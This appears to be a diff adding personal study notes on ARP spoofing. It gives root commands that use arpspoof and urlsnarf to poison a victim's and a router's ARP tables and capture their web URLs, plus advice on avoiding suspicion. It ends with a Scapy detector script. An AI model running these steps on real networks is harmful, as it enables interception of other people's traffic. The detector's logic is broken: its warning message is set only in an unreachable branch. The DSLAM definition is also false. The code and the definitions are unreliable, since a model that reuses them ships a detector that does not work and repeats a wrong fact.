@@ -1,0 +1,91 @@
+ARP Spoofing - Intercept and view other users' unencrypted web traffic. Exploits a vulnerability in 
+address resolution protocol (ARP).
+
+Digital subscriber line access multiplexer (DSLAM) - Allows signals associated with internet traffic 
+to be sent over wires originally intended for cable television. Distinguishes internet and TV signals.
+
+Local Area Network (LAN) - Lowest level hierarchy and all machines in that level are on the same router.
+
+From:		Source MAC:
+Address:	Source IP-Address:
+
+To:		Destination MAC:
+Address:	Destination IP-Address:
+
+ARP 
+1. [ARP query] is sent to all machines trying to find the IP it is looking for 
+2. [ARP Responce] is given containing the MAC addresses
+3. The router then stores this mapping [ARP Table]
+4. Router stores these, so that is can reduce the amount of ARP queries needed in the future
+
+ARP Spoofing Attack - You pretend to be someone else.
+
+Hacker tricks the router into sending them the info and then the info can then be forwarded to the
+intended receiver. [man-in-the-middle attack]
+
+Need to install tools to be able to ARP spoofing
+CMD
+sudo -i			[become a root user]
+apt-get update		[update the apt-get package manager to update dsniff]
+apt-get install dsniff	[download the specific tool dsniff]
+
+dsniff tools
+-arpspoof- [executes an ARP Attack]
+
+Step 1. Discover the ip addresses on the network to spoof them (netdiscover).
+Step 2. Enable IP forwarding (forward packets on behalf of other machines).
+CMDroot		echo 1 > /proc/sys/net/ipv4/ip_forward
+
+Step 3.	Generate fake ARP replies for the Victim computer [This will continue to run and needs to 
+update constantly to update the incorrect information].
+CMDroot		arpspoof -i eth0 -t <VICTIM_IP> <ROUTER_IP>
+
+Step 4. Generate fake ARP replies for the router [seperate CMD]
+CMDroot		arpspoof -i eth0 -t <ROUTER_IP> <VICTIM_IP> 
+
+Step 5. Inspect the packets and extract URLs [Seperate CMD]
+CMDroot		urlsnarf -i eth0
+
+Step 6. Then simulate traffic on the unit by sending the following or opening the browser on other PC
+CMD		wget http://www.google.com
+
+Step 7. After a few minutes the traffic should update on the urlsnarf [Packets need to be parsed]
+
+Step 8. Stop the arpspoof when done to not raise suspicion.
+
+DETECTING AN ARP ATTACK
+
+Scapy - A library that can intercept and parse the packets that pass through our NIC
+
+Commands to download pip3 and Scapy
+
+CMD		sudo apt-get install python3-pip
+CMD		pip3 install --pre scapy[basic]
+
+FILE: arpDetector.py
+
+from scapy.all import sniff
+IP_MAC_Map = {}
+def processPacket(packet):
+	src_IP = packet['ARP'].psrc
+	src_MAC = packet['Ether'].src
+	if src_MAC in IP_MAC_Map.keys():
+		if IP_MAC_Map[src_MAC] != src_IP :
+			try:
+				old_IP = IP_MAC_Map[src_MAC]
+			except:
+				old_IP = "unknown"
+				message = ("\n Possible ARP attack detected \n "
+				+ "It is possible that the machine with IP address \n "
+				+ str(old_IP) + " is pretending to be " + str(src_IP)
+				+"\n ")
+			return message
+	else:
+		IP_MAC_Map[src_MAC] = src_IP
+sniff(count=0, filter="arp", store = 0, prn = processPacket)
+
+CMD		sudo python3 arpDetector.py	[Runs the sniff] [Needs to be run before spoofing run]
+
+This will detect if a spoofing attach is done after. Notes the machine causing the problems.
+
+PYTHON: sys.argv[1]
